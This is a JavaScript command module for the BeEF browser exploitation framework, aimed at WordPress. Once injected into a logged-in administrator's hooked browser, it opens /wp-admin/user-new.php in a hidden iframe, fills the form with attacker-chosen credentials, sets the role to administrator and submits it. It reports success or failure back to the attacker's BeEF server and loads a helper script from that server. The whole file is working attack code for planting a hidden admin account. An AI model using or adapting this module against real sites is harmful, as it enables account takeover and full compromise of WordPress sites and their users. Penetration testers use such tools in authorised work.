/* jshint asi: true */
/* jshint laxcomma: true */

beef.execute(function () {
    'use strict';

    // Class /////////////////////////////////////////////////////////////////

    var UserCreator = function (opt) {
        this.opt = opt
    }

    // Class: API ////////////////////////////////////////////////////////////

    UserCreator.prototype.create = function (callback) {
        var self = this

        async.waterfall([
            function (cb) {
                self.openIFrame(function (err, form) {
                    if (err) {
                        callback(err)
                        return
                    }
                    cb(null, form)
                })
            },
            function (form, cb) {
                self.submitForm(form, function (err) {
                    if (err) {
                        callback(err)
                        return
                    }
                    cb(null)
                })
            },
        ], function (err) {
            if (err) {
                beef.net.send(
                    self.opt.command_url,
                    self.opt.command_id,
                    'failed at creating user: '+JSON.stringify(err))
            } else {
                beef.net.send(
                    self.opt.command_url,
                    self.opt.command_id,
                    'successfully created user')
            }
        })
    }

    // Class: private methods ////////////////////////////////////////////////

    UserCreator.prototype.openIFrame = function (callback) {
        var x = true
        var iframe = beef.dom.createIframe('hidden', 'get', {src: '/wp-admin/user-new.php'}, {}, function () {
            if (x) {
                x = false
                var form = this.contentWindow.document.getElementById('createuser')
                callback(null, form)
            }
        })
    }

    UserCreator.prototype.submitForm = function (form, callback) {
        var doc = form.ownerDocument
        doc.getElementById('user_login').value = this.opt.user_login
        doc.getElementById('email').value = this.opt.user_email
        doc.getElementById('pass1').value = this.opt.user_pass
        doc.getElementById('pass2').value = this.opt.user_pass
        doc.getElementById('role').value = 'administrator'
        form.submit()
        callback(null)
    }

    // Main //////////////////////////////////////////////////////////////////

    var main = function () {
        var u = new UserCreator({
            command_url: '<%== @command_url %>',
            command_id: parseInt('<%== @command_id %>', 10),
            user_login: '<%== @user_login %>',
            user_email: '<%== @user_email %>',
            user_pass: '<%== @user_pass %>',
        })

        u.create()
    }

    // Load scripts then run main code ///////////////////////////////////////

    document.body.appendChild(beef.dom.createElement('script', {src: beef.net.httpproto + '://'+beef.net.host+':'+beef.net.port+'/wordpress/create_user/async.js'}))

    var interval = setInterval(function () {
        if (typeof async !== 'undefined') {
            clearInterval(interval)
            main()
        }
    }, 100)
})
